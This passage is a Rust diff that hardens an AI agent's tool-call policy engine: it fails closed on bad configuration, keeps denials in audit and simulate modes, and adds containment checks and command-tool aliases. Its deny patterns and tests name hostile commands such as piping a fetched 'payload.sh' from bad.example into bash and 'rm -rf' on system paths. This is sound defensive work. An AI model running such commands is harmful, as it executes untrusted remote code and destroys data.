@@ -7,11 +7,12 @@ use std::collections::HashSet;
 use std::path::{Path, PathBuf};
 use std::sync::LazyLock;
 
+use hermes_environments::ExecutionContainmentContext;
 use regex::Regex;
-use serde::Deserialize;
+use serde::{Deserialize, Serialize};
 use serde_json::Value;
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
 pub enum ToolPolicyMode {
     Off,
     Audit,
@@ -28,13 +29,13 @@ enum ToolPolicyPreset {
 }
 
 impl ToolPolicyPreset {
-    fn parse(raw: &str) -> Option<Self> {
+    fn parse(raw: &str) -> Result<Self, String> {
         match raw.trim().to_ascii_lowercase().as_str() {
-            "strict" => Some(Self::Strict),
-            "balanced" => Some(Self::Balanced),
-            "dev" => Some(Self::Dev),
-            "relaxed" | "loose" | "permissive" => Some(Self::Relaxed),
-            _ => None,
+            "strict" => Ok(Self::Strict),
+            "balanced" => Ok(Self::Balanced),
+            "dev" => Ok(Self::Dev),
+            "relaxed" | "loose" | "permissive" => Ok(Self::Relaxed),
+            _ => Err(format!("invalid tool policy preset '{raw}'")),
         }
     }
 }
@@ -49,13 +50,25 @@ impl ToolPolicyMode {
         }
     }
 
-    fn parse(raw: &str) -> Self {
+    fn parse(raw: &str) -> Result<Self, String> {
         match raw.trim().to_ascii_lowercase().as_str() {
-            "off" => Self::Off,
-            "audit" => Self::Audit,
-            "simulate" => Self::Simulate,
-            _ => Self::Enforce,
+            "off" => Ok(Self::Off),
+            "audit" => Ok(Self::Audit),
+            "simulate" => Ok(Self::Simulate),
+            "enforce" => Ok(Self::Enforce),
+            _ => Err(format!("invalid tool policy mode '{raw}'")),
         }
+    }
+
+    fn parse_production(raw: &str) -> Result<Self, String> {
+        let mode = Self::parse(raw)?;
+        if matches!(mode, Self::Off) {
+            return Err(
+                "tool policy mode 'off' is manual-only and cannot be selected from configuration"
+                    .to_string(),
+            );
+        }
+        Ok(mode)
     }
 }
 
@@ -67,15 +80,17 @@ enum ExecutionSandboxProfile {
 }
 
 impl ExecutionSandboxProfile {
-    fn parse(raw: &str) -> Option<Self> {
+    fn parse(raw: &str) -> Result<Self, String> {
         match raw.trim().to_ascii_lowercase().as_str() {
-            "strict" => Some(Self::Strict),
-            "balanced" => Some(Self::Balanced),
-            "dev" | "off" => Some(Self::Dev),
-            _ => None,
+            "strict" => Ok(Self::Strict),
+            "balanced" => Ok(Self::Balanced),
+            "dev" => Ok(Self::Dev),
+            _ => Err(format!("invalid execution sandbox profile '{raw}'")),
         }
     }
 }
+
+const DEFAULT_MAX_PARAM_BYTES: usize = 256 * 1024;
 
 #[derive(Debug, Clone)]
 pub struct ToolPolicyEngine {
@@ -85,15 +100,21 @@ pub struct ToolPolicyEngine {
     deny_param_patterns: Vec<Regex>,
     max_param_bytes: usize,
     sandbox_profile: ExecutionSandboxProfile,
+    configuration_error: Option<String>,
 }
 
-#[derive(Debug, Clone)]
+/// The mode-independent allow/deny/reason produced by one policy evaluation.
+///
+/// `allow`, `reason`, and `code` are the same values an enforcing dispatch
+/// uses. The remaining fields describe dispatch context and never rewrite the
+/// evaluator into an allow.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 pub struct ToolPolicyDecision {
     pub allow: bool,
     pub reason: Option<String>,
+    pub code: Option<String>,
     pub audited_only: bool,
     pub mode: ToolPolicyMode,
-    pub code: Option<String>,
     pub simulated: bool,
     pub would_block: bool,
 }
@@ -114,6 +135,33 @@ struct ToolPolicyFileConfig {
     denylist: Option<Vec<String>>,
     deny_param_patterns: Option<Vec<String>>,
     max_param_bytes: Option<usize>,
+    sandbox_profile: Option<String>,
+}
+
+impl ToolPolicyDecision {
+    fn allowed(mode: ToolPolicyMode) -> Self {
+        Self {
+            allow: true,
+            reason: None,
+            code: None,
+            audited_only: matches!(mode, ToolPolicyMode::Audit),
+            mode,
+            simulated: matches!(mode, ToolPolicyMode::Simulate),
+            would_block: false,
+        }
+    }
+
+    fn denied(reason: impl Into<String>, code: impl Into<String>, mode: ToolPolicyMode) -> Self {
+        Self {
+            allow: false,
+            reason: Some(reason.into()),
+            code: Some(code.into()),
+            audited_only: matches!(mode, ToolPolicyMode::Audit),
+            mode,
+            simulated: matches!(mode, ToolPolicyMode::Simulate),
+            would_block: true,
+        }
+    }
 }
 
 impl ToolPolicyEngine {
@@ -123,46 +171,75 @@ impl ToolPolicyEngine {
             allowlist: HashSet::new(),
             denylist: HashSet::new(),
             deny_param_patterns: Vec::new(),
-            max_param_bytes: 256 * 1024,
+            max_param_bytes: DEFAULT_MAX_PARAM_BYTES,
             sandbox_profile: ExecutionSandboxProfile::Balanced,
+            configuration_error: None,
         }
     }
 
-    pub fn from_env() -> Self {
-        let preset = std::env::var("HERMES_TOOL_POLICY_PRESET")
-            .ok()
-            .as_deref()
-            .and_then(ToolPolicyPreset::parse)
-            .unwrap_or(ToolPolicyPreset::Relaxed);
+    pub fn mode(&self) -> ToolPolicyMode {
+        self.mode
+    }
+
+    /// Parse environment-backed policy configuration without silently
+    /// weakening malformed values.
+    pub fn try_from_env() -> Result<Self, String> {
+        let preset = match environment_value("HERMES_TOOL_POLICY_PRESET")? {
+            Some(value) => ToolPolicyPreset::parse(&value)
+                .map_err(|error| format!("HERMES_TOOL_POLICY_PRESET: {error}"))?,
+            None => ToolPolicyPreset::Balanced,
+        };
         let mut policy = Self::from_preset(preset);
 
-        if let Ok(path) = std::env::var("HERMES_TOOL_POLICY_FILE") {
-            if let Ok(from_file) = Self::from_file(path.trim()) {
-                policy.apply_layer(from_file);
+        if let Some(path) = environment_value("HERMES_TOOL_POLICY_FILE")? {
+            let path = path.trim();
+            if path.is_empty() {
+                return Err("HERMES_TOOL_POLICY_FILE must not be empty".to_string());
             }
+            policy.apply_layer(Self::from_file(path)?);
         }
-        if let Ok(mode) = std::env::var("HERMES_TOOL_POLICY_MODE") {
-            policy.mode = ToolPolicyMode::parse(&mode);
+        if let Some(mode) = environment_value("HERMES_TOOL_POLICY_MODE")? {
+            policy.mode = ToolPolicyMode::parse_production(&mode)
+                .map_err(|error| format!("HERMES_TOOL_POLICY_MODE: {error}"))?;
         }
-        if let Ok(value) = std::env::var("HERMES_TOOL_POLICY_ALLOWLIST") {
+        if let Some(value) = environment_value("HERMES_TOOL_POLICY_ALLOWLIST")? {
             policy.allowlist = parse_csv_set(&value);
         }
-        if let Ok(value) = std::env::var("HERMES_TOOL_POLICY_DENYLIST") {
+        if let Some(value) = environment_value("HERMES_TOOL_POLICY_DENYLIST")? {
             policy.denylist = parse_csv_set(&value);
         }
-        if let Ok(value) = std::env::var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS") {
-            policy.deny_param_patterns = compile_patterns(&parse_csv_list(&value));
+        if let Some(value) = environment_value("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS")? {
+            policy.deny_param_patterns = compile_patterns_checked(&parse_csv_list(&value))
+                .map_err(|error| format!("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS: {error}"))?;
         }
-        if let Ok(value) = std::env::var("HERMES_TOOL_POLICY_MAX_PARAM_BYTES") {
-            if let Some(max) = value.trim().parse::<usize>().ok().filter(|v| *v > 0) {
-                policy.max_param_bytes = max;
-            }
+        if let Some(value) = environment_value("HERMES_TOOL_POLICY_MAX_PARAM_BYTES")? {
+            policy.max_param_bytes = value
+                .trim()
+                .parse::<usize>()
+                .ok()
+                .filter(|max| *max > 0)
+                .ok_or_else(|| {
+                    format!(
+                        "HERMES_TOOL_POLICY_MAX_PARAM_BYTES must be a positive integer, got '{value}'"
+                    )
+                })?;
         }
-        if let Ok(value) = std::env::var("HERMES_EXECUTION_SANDBOX_PROFILE") {
-            if let Some(profile) = ExecutionSandboxProfile::parse(&value) {
-                policy.sandbox_profile = profile;
-            }
+        if let Some(value) = environment_value("HERMES_EXECUTION_SANDBOX_PROFILE")? {
+            policy.sandbox_profile = ExecutionSandboxProfile::parse(&value)
+                .map_err(|error| format!("HERMES_EXECUTION_SANDBOX_PROFILE: {error}"))?;
         }
+        Ok(policy)
+    }
+
+    /// Construct the environment policy. Configuration failure stays visible
+    /// to dispatch as a deny rather than falling back to a weaker default.
+    pub fn from_env() -> Self {
+        Self::try_from_env().unwrap_or_else(Self::fail_closed)
+    }
+
+    fn fail_closed(error: String) -> Self {
+        let mut policy = Self::from_preset(ToolPolicyPreset::Strict);
+        policy.configuration_error = Some(error);
         policy
     }
 
@@ -171,39 +248,53 @@ impl ToolPolicyEngine {
             .map_err(|e| format!("read policy file {}: {}", path.as_ref().display(), e))?;
         let cfg: ToolPolicyFileConfig = serde_json::from_str(&raw)
             .map_err(|e| format!("parse policy file {}: {}", path.as_ref().display(), e))?;
-        Ok(Self::from_file_config(cfg))
+        Self::from_file_config(cfg)
     }
 
-    fn from_file_config(cfg: ToolPolicyFileConfig) -> Self {
-        let mode = cfg
-            .mode
-            .as_deref()
-            .map(ToolPolicyMode::parse)
-            .unwrap_or(ToolPolicyMode::Enforce);
+    fn from_file_config(cfg: ToolPolicyFileConfig) -> Result<Self, String> {
+        let mode = match cfg.mode {
+            Some(value) => ToolPolicyMode::parse_production(&value)
+                .map_err(|error| format!("policy file mode: {error}"))?,
+            None => ToolPolicyMode::Enforce,
+        };
         let allowlist = cfg
             .allowlist
             .unwrap_or_default()
             .into_iter()
-            .map(|v| v.trim().to_ascii_lowercase())
-            .filter(|v| !v.is_empty())
+            .map(|value| value.trim().to_ascii_lowercase())
+            .filter(|value| !value.is_empty())
             .collect();
         let denylist = cfg
             .denylist
             .unwrap_or_default()
             .into_iter()
-            .map(|v| v.trim().to_ascii_lowercase())
-            .filter(|v| !v.is_empty())
+            .map(|value| value.trim().to_ascii_lowercase())
+            .filter(|value| !value.is_empty())
             .collect();
-        let deny_param_patterns = compile_patterns(&cfg.deny_param_patterns.unwrap_or_default());
-        let max_param_bytes = cfg.max_param_bytes.filter(|v| *v > 0).unwrap_or(256 * 1024);
-        Self {
+        let deny_param_patterns =
+            compile_patterns_checked(&cfg.deny_param_patterns.unwrap_or_default())
+                .map_err(|error| format!("policy file deny_param_patterns: {error}"))?;
+        let max_param_bytes = match cfg.max_param_bytes {
+            Some(value) if value > 0 => value,
+            Some(_) => {
+                return Err("policy file max_param_bytes must be a positive integer".to_string())
+            }
+            None => DEFAULT_MAX_PARAM_BYTES,
+        };
+        let sandbox_profile = match cfg.sandbox_profile {
+            Some(value) => ExecutionSandboxProfile::parse(&value)
+                .map_err(|error| format!("policy file sandbox_profile: {error}"))?,
+            None => ExecutionSandboxProfile::Balanced,
+        };
+        Ok(Self {
             mode,
             allowlist,
             denylist,
             deny_param_patterns,
             max_param_bytes,
-            sandbox_profile: ExecutionSandboxProfile::Balanced,
-        }
+            sandbox_profile,
+            configuration_error: None,
+        })
     }
 
     fn from_preset(preset: ToolPolicyPreset) -> Self {
@@ -212,33 +303,37 @@ impl ToolPolicyEngine {
                 mode: ToolPolicyMode::Enforce,
                 allowlist: HashSet::new(),
                 denylist: HashSet::new(),
-                deny_param_patterns: compile_patterns(&default_deny_patterns()),
+                deny_param_patterns: builtin_patterns(default_deny_patterns()),
                 max_param_bytes: 128 * 1024,
                 sandbox_profile: ExecutionSandboxProfile::Strict,
+                configuration_error: None,
             },
             ToolPolicyPreset::Balanced => Self {
                 mode: ToolPolicyMode::Enforce,
                 allowlist: HashSet::new(),
                 denylist: HashSet::new(),
-                deny_param_patterns: compile_patterns(&default_deny_patterns()),
-                max_param_bytes: 256 * 1024,
+                deny_param_patterns: builtin_patterns(default_deny_patterns()),
+                max_param_bytes: DEFAULT_MAX_PARAM_BYTES,
                 sandbox_profile: ExecutionSandboxProfile::Balanced,
+                configuration_error: None,
             },
             ToolPolicyPreset::Dev => Self {
                 mode: ToolPolicyMode::Audit,
                 allowlist: HashSet::new(),
                 denylist: HashSet::new(),
-                deny_param_patterns: compile_patterns(&default_deny_patterns()),
+                deny_param_patterns: builtin_patterns(default_deny_patterns()),
                 max_param_bytes: 512 * 1024,
                 sandbox_profile: ExecutionSandboxProfile::Dev,
+                configuration_error: None,
             },
             ToolPolicyPreset::Relaxed => Self {
                 mode: ToolPolicyMode::Enforce,
                 allowlist: HashSet::new(),
                 denylist: HashSet::new(),
-                deny_param_patterns: compile_patterns(&default_relaxed_deny_patterns()),
+                deny_param_patterns: builtin_patterns(default_relaxed_deny_patterns()),
                 max_param_bytes: 1024 * 1024,
                 sandbox_profile: ExecutionSandboxProfile::Dev,
+                configuration_error: None,
             },
         }
     }
@@ -250,13 +345,14 @@ impl ToolPolicyEngine {
         self.deny_param_patterns = layer.deny_param_patterns;
         self.max_param_bytes = layer.max_param_bytes;
         self.sandbox_profile = layer.sandbox_profile;
+        self.configuration_error = layer.configuration_error;
     }
 
     pub fn with_allowlist(mut self, names: &[&str]) -> Self {
         self.allowlist = names
             .iter()
-            .map(|v| v.trim().to_ascii_lowercase())
-            .filter(|s| !s.is_empty())
+            .map(|value| value.trim().to_ascii_lowercase())
+            .filter(|name| !name.is_empty())
             .collect();
         self
     }
@@ -264,8 +360,8 @@ impl ToolPolicyEngine {
     pub fn with_denylist(mut self, names: &[&str]) -> Self {
         self.denylist = names
             .iter()
-            .map(|v| v.trim().to_ascii_lowercase())
-            .filter(|s| !s.is_empty())
+            .map(|value| value.trim().to_ascii_lowercase())
+            .filter(|name| !name.is_empty())
             .collect();
         self
     }
@@ -273,31 +369,40 @@ impl ToolPolicyEngine {
     pub fn with_deny_param_patterns(mut self, patterns: &[&str]) -> Self {
         let raw: Vec<String> = patterns
             .iter()
-            .map(|v| v.trim().to_string())
-            .filter(|s| !s.is_empty())
+            .map(|value| value.trim().to_string())
+            .filter(|value| !value.is_empty())
             .collect();
-        self.deny_param_patterns = compile_patterns(&raw);
+        match compile_patterns_checked(&raw) {
+            Ok(patterns) => self.deny_param_patterns = patterns,
+            Err(error) => {
+                self.configuration_error = Some(format!(
+                    "invalid programmatic deny parameter pattern: {error}"
+                ));
+            }
+        }
         self
     }
 
     pub fn with_max_param_bytes(mut self, max_param_bytes: usize) -> Self {
-        if max_param_bytes > 0 {
+        if max_param_bytes == 0 {
+            self.configuration_error =
+                Some("programmatic max parameter bytes must be positive".to_string());
+        } else {
             self.max_param_bytes = max_param_bytes;
         }
         self
     }
 
     pub fn evaluate(&self, tool_name: &str, params: &Value) -> ToolPolicyDecision {
+        if let Some(error) = &self.configuration_error {
+            return ToolPolicyDecision::denied(
+                format!("tool policy configuration is invalid: {error}"),
+                "invalid_policy_configuration",
+                self.mode,
+            );
+        }
         if matches!(self.mode, ToolPolicyMode::Off) {
-            return ToolPolicyDecision {
-                allow: true,
-                reason: None,
-                audited_only: false,
-                mode: self.mode,
-                code: None,
-                simulated: false,
-                would_block: false,
-            };
+            return ToolPolicyDecision::allowed(self.mode);
         }
 
         let normalized_name = tool_name.trim().to_ascii_lowercase();
@@ -305,10 +410,10 @@ impl ToolPolicyEngine {
         let mut deny_code = None;
 
         if self.denylist.contains(&normalized_name) {
-            deny_reason = Some(format!("tool '{}' is denylisted", tool_name));
+            deny_reason = Some(format!("tool '{tool_name}' is denylisted"));
             deny_code = Some("tool_denylisted".to_string());
         } else if !self.allowlist.is_empty() && !self.allowlist.contains(&normalized_name) {
-            deny_reason = Some(format!("tool '{}' is not in policy allowlist", tool_name));
+            deny_reason = Some(format!("tool '{tool_name}' is not in policy allowlist"));
             deny_code = Some("tool_not_allowlisted".to_string());
         } else if !params.is_null() {
             if let Some((reason, code)) =
@@ -316,30 +421,21 @@ impl ToolPolicyEngine {
             {
                 deny_reason = Some(reason);
                 deny_code = Some(code);
-            } else if self.deny_param_patterns.is_empty() {
-                let serialized_len = estimate_json_len_capped(params, self.max_param_bytes);
-                if serialized_len > self.max_param_bytes {
-                    deny_reason = Some(format!(
-                        "tool params exceed max bytes: {} > {}",
-                        serialized_len, self.max_param_bytes
-                    ));
-                    deny_code = Some("params_too_large".to_string());
-                }
             } else {
                 let serialized_len = estimate_json_len_capped(params, self.max_param_bytes);
                 if serialized_len > self.max_param_bytes {
                     deny_reason = Some(format!(
-                        "tool params exceed max bytes: {} > {}",
-                        serialized_len, self.max_param_bytes
+                        "tool params exceed max bytes: {serialized_len} > {}",
+                        self.max_param_bytes
                     ));
                     deny_code = Some("params_too_large".to_string());
-                } else {
+                } else if !self.deny_param_patterns.is_empty() {
                     match serde_json::to_string(params) {
                         Ok(params_str) => {
                             if let Some(pattern) = self
                                 .deny_param_patterns
                                 .iter()
-                                .find(|p| p.is_match(&params_str))
+                                .find(|pattern| pattern.is_match(&params_str))
                             {
                                 deny_reason = Some(format!(
                                     "tool params matched deny pattern '{}'",
@@ -359,64 +455,57 @@ impl ToolPolicyEngine {
             }
         }
 
-        match deny_reason {
-            None => {
-                if matches!(self.mode, ToolPolicyMode::Simulate) {
-                    ToolPolicyDecision {
-                        allow: true,
-                        reason: Some("simulation: tool call would be allowed".to_string()),
-                        audited_only: false,
-                        mode: self.mode,
-                        code: Some("simulation_allow".to_string()),
-                        simulated: true,
-                        would_block: false,
-                    }
-                } else {
-                    ToolPolicyDecision {
-                        allow: true,
-                        reason: None,
-                        audited_only: false,
-                        mode: self.mode,
-                        code: None,
-                        simulated: false,
-                        would_block: false,
-                    }
-                }
-            }
-            Some(reason) => {
-                if matches!(self.mode, ToolPolicyMode::Audit) {
-                    ToolPolicyDecision {
-                        allow: true,
-                        reason: Some(reason),
-                        audited_only: true,
-                        mode: self.mode,
-                        code: deny_code,
-                        simulated: false,
-                        would_block: true,
-                    }
-                } else if matches!(self.mode, ToolPolicyMode::Simulate) {
-                    ToolPolicyDecision {
-                        allow: true,
-                        reason: Some(format!("simulation: would block - {}", reason)),
-                        audited_only: true,
-                        mode: self.mode,
-                        code: deny_code,
-                        simulated: true,
-                        would_block: true,
-                    }
-                } else {
-                    ToolPolicyDecision {
-                        allow: false,
-                        reason: Some(reason),
-                        audited_only: false,
-                        mode: self.mode,
-                        code: deny_code,
-                        simulated: false,
-                        would_block: true,
-                    }
-                }
-            }
+        match (deny_reason, deny_code) {
+            (Some(reason), Some(code)) => ToolPolicyDecision::denied(reason, code, self.mode),
+            _ => ToolPolicyDecision::allowed(self.mode),
         }
+    }
+
+    /// Evaluate a dispatch using the same containment context the handler must
+    /// consume. Closed modes never turn a backend label or configuration hash
+    /// into permission to invoke a host-sensitive handler.
+    pub(crate) fn evaluate_with_containment(
+        &self,
+        tool_name: &str,
+        params: &Value,
+        containment_required: bool,
+        containment_dispatch_available: bool,
+        context: &ExecutionContainmentContext,
+    ) -> ToolPolicyDecision {
+        let decision = self.evaluate(tool_name, params);
+        if !decision.allow
+            || !containment_required
+            || !context.mode().mode.requires_containment_certificate()
+        {
+            return decision;
+        }
+        if !context.is_certified_dispatch_context() {
+            return ToolPolicyDecision::denied(
+                format!(
+                    "tool '{tool_name}' requires the exact certified containment context in closed execution mode"
+                ),
+                "missing_containment_certificate",
+                self.mode,
+            );
+        }
+        if !containment_dispatch_available {
+            return ToolPolicyDecision::denied(
+                format!(
+                    "tool '{tool_name}' has no containment-bound dispatch path for the certified backend"
+                ),
+                "containment_dispatch_unavailable",
+                self.mode,
+            );
+        }
+        decision
+    }
+}
+
+fn environment_value(name: &str) -> Result<Option<String>, String> {
+    match std::env::var(name) {
+        Ok(value) => Ok(Some(value)),
+        Err(std::env::VarError::NotPresent) => Ok(None),
+        Err(std::env::VarError::NotUnicode(_)) => Err(format!("{name} must contain valid UTF-8")),
     }
 }
 
@@ -520,10 +609,16 @@ fn parse_csv_list(raw: &str) -> Vec<String> {
         .collect()
 }
 
-fn compile_patterns(raw: &[String]) -> Vec<Regex> {
+fn compile_patterns_checked(raw: &[String]) -> Result<Vec<Regex>, String> {
     raw.iter()
-        .filter_map(|entry| Regex::new(entry).ok())
+        .map(|entry| {
+            Regex::new(entry).map_err(|error| format!("invalid regex '{}': {error}", entry.trim()))
+        })
         .collect()
+}
+
+fn builtin_patterns(raw: Vec<String>) -> Vec<Regex> {
+    compile_patterns_checked(&raw).expect("built-in tool policy patterns must compile")
 }
 
 fn default_deny_patterns() -> Vec<String> {
@@ -545,19 +640,27 @@ fn default_relaxed_deny_patterns() -> Vec<String> {
 
 fn command_field_from_params(params: &Value) -> Option<String> {
     let obj = params.as_object()?;
-    let from_keys = ["cmd", "command", "shell_command", "script"];
+    let from_keys = [
+        "cmd",
+        "command",
+        "shell_command",
+        "bash_command",
+        "script",
+        "code",
+        "input",
+    ];
     for key in from_keys {
-        if let Some(raw) = obj.get(key).and_then(|v| v.as_str()) {
+        if let Some(raw) = obj.get(key).and_then(Value::as_str) {
             let trimmed = raw.trim();
             if !trimmed.is_empty() {
                 return Some(trimmed.to_string());
             }
         }
     }
-    if let Some(args) = obj.get("args").and_then(|v| v.as_array()) {
+    if let Some(args) = obj.get("args").and_then(Value::as_array) {
         let joined = args
             .iter()
-            .filter_map(|v| v.as_str())
+            .filter_map(Value::as_str)
             .collect::<Vec<_>>()
             .join(" ");
         if !joined.trim().is_empty() {
@@ -567,12 +670,29 @@ fn command_field_from_params(params: &Value) -> Option<String> {
     None
 }
 
+/// All public tool names that can carry a host or remote command payload.
+///
+/// Keep aliases explicit: a name match is policy classification, not a claim
+/// that arbitrary tools are safely isolated.
 static COMMAND_TOOLS: &[&str] = &[
     "terminal",
     "bash",
-    "exec_command",
+    "sh",
+    "zsh",
     "shell",
+    "shell_command",
+    "command",
+    "exec",
+    "exec_command",
+    "execute",
+    "execute_command",
+    "execute_code",
+    "code_execution",
+    "run",
     "run_command",
+    "run_shell",
+    "run_shell_command",
+    "run_terminal_command",
     "write_stdin",
 ];
 
@@ -589,10 +709,14 @@ static STRICT_SANDBOX_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
 });
 
 static BALANCED_SANDBOX_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
-    [r"\brm\s+-rf\s+/(?!tmp\b)", r"\bcurl\s+.*\|\s*(sh|bash)\b"]
-        .iter()
-        .filter_map(|pat| Regex::new(pat).ok())
-        .collect()
+    [
+        r"\brm\s+-rf\s+/(?!tmp\b)",
+        r"\bcurl\s+.*\|\s*(sh|bash)\b",
+        r"\bssh\b",
+    ]
+    .iter()
+    .filter_map(|pat| Regex::new(pat).ok())
+    .collect()
 });
 
 fn sandbox_profile_violation(
@@ -732,6 +856,43 @@ mod tests {
 
     static ENV_LOCK: LazyLock<Mutex<()>> = LazyLock::new(|| Mutex::new(()));
 
+    const POLICY_ENV_KEYS: &[&str] = &[
+        "HERMES_TOOL_POLICY_PRESET",
+        "HERMES_TOOL_POLICY_FILE",
+        "HERMES_TOOL_POLICY_MODE",
+        "HERMES_TOOL_POLICY_ALLOWLIST",
+        "HERMES_TOOL_POLICY_DENYLIST",
+        "HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS",
+        "HERMES_TOOL_POLICY_MAX_PARAM_BYTES",
+        "HERMES_EXECUTION_SANDBOX_PROFILE",
+    ];
+
+    struct PolicyEnvGuard(Vec<(&'static str, Option<std::ffi::OsString>)>);
+
+    impl PolicyEnvGuard {
+        fn clear() -> Self {
+            let saved = POLICY_ENV_KEYS
+                .iter()
+                .map(|key| (*key, std::env::var_os(key)))
+                .collect();
+            for key in POLICY_ENV_KEYS {
+                std::env::remove_var(key);
+            }
+            Self(saved)
+        }
+    }
+
+    impl Drop for PolicyEnvGuard {
+        fn drop(&mut self) {
+            for (key, value) in self.0.drain(..) {
+                match value {
+                    Some(value) => std::env::set_var(key, value),
+                    None => std::env::remove_var(key),
+                }
+            }
+        }
+    }
+
     #[derive(Clone, Copy)]
     struct XorShift64(u64);
 
@@ -840,12 +1001,12 @@ mod tests {
     }
 
     #[test]
-    fn policy_audit_mode_allows_with_warning() {
+    fn policy_audit_mode_records_but_preserves_deny() {
         let policy = ToolPolicyEngine::new(ToolPolicyMode::Audit)
             .with_allowlist(&["read_file"])
             .with_max_param_bytes(1024);
         let decision = policy.evaluate("write_file", &serde_json::json!({"path":"a"}));
-        assert!(decision.allow);
+        assert!(!decision.allow);
         assert!(decision.audited_only);
         assert_eq!(decision.mode, ToolPolicyMode::Audit);
         assert_eq!(decision.code.as_deref(), Some("tool_not_allowlisted"));
@@ -869,7 +1030,7 @@ mod tests {
     }
 
     #[test]
-    fn policy_from_file_loads_mode_and_patterns() {
+    fn policy_from_file_loads_mode_and_preserves_deny() {
         let tmp = tempfile::tempdir().expect("tempdir");
         let file = tmp.path().join("policy.json");
         std::fs::write(
@@ -884,9 +1045,10 @@ mod tests {
         .expect("write policy file");
         let policy = ToolPolicyEngine::from_file(&file).expect("load policy");
         let decision = policy.evaluate("write_file", &serde_json::json!({"q":"secret=abc"}));
-        assert!(decision.allow);
+        assert!(!decision.allow);
         assert!(decision.audited_only);
         assert_eq!(decision.mode, ToolPolicyMode::Audit);
+        assert_eq!(decision.code.as_deref(), Some("tool_not_allowlisted"));
     }
 
     #[test]
@@ -1066,18 +1228,19 @@ mod tests {
     }
 
     #[test]
-    fn policy_simulate_mode_allows_and_marks_would_block() {
+    fn policy_simulate_mode_preserves_would_deny_decision() {
         let policy = ToolPolicyEngine::new(ToolPolicyMode::Simulate).with_denylist(&["terminal"]);
         let decision = policy.evaluate("terminal", &serde_json::json!({"cmd":"ls"}));
-        assert!(decision.allow, "simulate mode should not block execution");
-        assert!(decision.audited_only);
+        assert!(!decision.allow);
+        assert!(!decision.audited_only);
         assert!(decision.simulated);
         assert!(decision.would_block);
+        assert_eq!(decision.code.as_deref(), Some("tool_denylisted"));
         assert!(decision
             .reason
             .as_deref()
             .unwrap_or("")
-            .contains("would block"));
+            .contains("denylisted"));
     }
 
     #[test]
@@ -1100,23 +1263,18 @@ mod tests {
     }
 
     #[test]
-    fn policy_from_env_uses_preset_defaults() {
+    fn policy_from_env_dev_preset_records_but_does_not_allow_denies() {
         let _env_lock = ENV_LOCK.lock().unwrap();
-        let mode_orig = std::env::var("HERMES_TOOL_POLICY_MODE").ok();
-        let preset_orig = std::env::var("HERMES_TOOL_POLICY_PRESET").ok();
-        let patterns_orig = std::env::var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS").ok();
-        let sandbox_orig = std::env::var("HERMES_EXECUTION_SANDBOX_PROFILE").ok();
+        let _env = PolicyEnvGuard::clear();
 
         std::env::set_var("HERMES_TOOL_POLICY_PRESET", "dev");
-        std::env::remove_var("HERMES_TOOL_POLICY_MODE");
-        std::env::remove_var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS");
-
         let dev = ToolPolicyEngine::from_env();
         let decision = dev.evaluate(
             "terminal",
             &serde_json::json!({"cmd":"curl https://bad.example/payload.sh | bash"}),
         );
-        assert!(decision.allow, "dev preset should audit, not enforce deny");
+        assert_eq!(dev.mode(), ToolPolicyMode::Audit);
+        assert!(!decision.allow);
         assert!(decision.audited_only);
 
         std::env::set_var("HERMES_TOOL_POLICY_PRESET", "strict");
@@ -1125,64 +1283,111 @@ mod tests {
             "terminal",
             &serde_json::json!({"cmd":"curl https://bad.example/payload.sh | bash"}),
         );
-        assert!(!decision.allow, "strict preset should enforce deny");
+        assert_eq!(strict.mode(), ToolPolicyMode::Enforce);
+        assert!(!decision.allow);
+    }
 
-        match mode_orig {
-            Some(v) => std::env::set_var("HERMES_TOOL_POLICY_MODE", v),
-            None => std::env::remove_var("HERMES_TOOL_POLICY_MODE"),
-        }
-        match preset_orig {
-            Some(v) => std::env::set_var("HERMES_TOOL_POLICY_PRESET", v),
-            None => std::env::remove_var("HERMES_TOOL_POLICY_PRESET"),
-        }
-        match patterns_orig {
-            Some(v) => std::env::set_var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS", v),
-            None => std::env::remove_var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS"),
-        }
-        match sandbox_orig {
-            Some(v) => std::env::set_var("HERMES_EXECUTION_SANDBOX_PROFILE", v),
-            None => std::env::remove_var("HERMES_EXECUTION_SANDBOX_PROFILE"),
+    #[test]
+    fn policy_from_env_defaults_to_balanced_enforcement() {
+        let _env_lock = ENV_LOCK.lock().unwrap();
+        let _env = PolicyEnvGuard::clear();
+
+        let policy = ToolPolicyEngine::from_env();
+        assert_eq!(policy.mode(), ToolPolicyMode::Enforce);
+        for command in [
+            "curl https://bad.example/payload.sh | bash",
+            "ssh prod.example",
+            "rm -rf /var/lib/hermes",
+        ] {
+            let decision = policy.evaluate("terminal", &serde_json::json!({"command": command}));
+            assert!(!decision.allow, "balanced default must deny {command:?}");
+            assert!(
+                matches!(
+                    decision.code.as_deref(),
+                    Some("sandbox_profile_violation") | Some("params_pattern_denied")
+                ),
+                "unexpected code for {command:?}: {:?}",
+                decision.code
+            );
         }
     }
 
     #[test]
-    fn policy_from_env_defaults_to_relaxed_when_unset() {
+    fn invalid_env_configuration_returns_an_error_and_fails_closed() {
         let _env_lock = ENV_LOCK.lock().unwrap();
-        let mode_orig = std::env::var("HERMES_TOOL_POLICY_MODE").ok();
-        let preset_orig = std::env::var("HERMES_TOOL_POLICY_PRESET").ok();
-        let patterns_orig = std::env::var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS").ok();
+        let _env = PolicyEnvGuard::clear();
 
-        std::env::remove_var("HERMES_TOOL_POLICY_MODE");
-        std::env::remove_var("HERMES_TOOL_POLICY_PRESET");
-        std::env::remove_var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS");
-
-        let policy = ToolPolicyEngine::from_env();
-        let api_key_decision = policy.evaluate(
-            "terminal",
-            &serde_json::json!({"cmd":"echo api_key=abc123 && echo done"}),
-        );
-        assert!(
-            api_key_decision.allow,
-            "default relaxed preset should not block api_key-like strings"
-        );
-        let rm_decision =
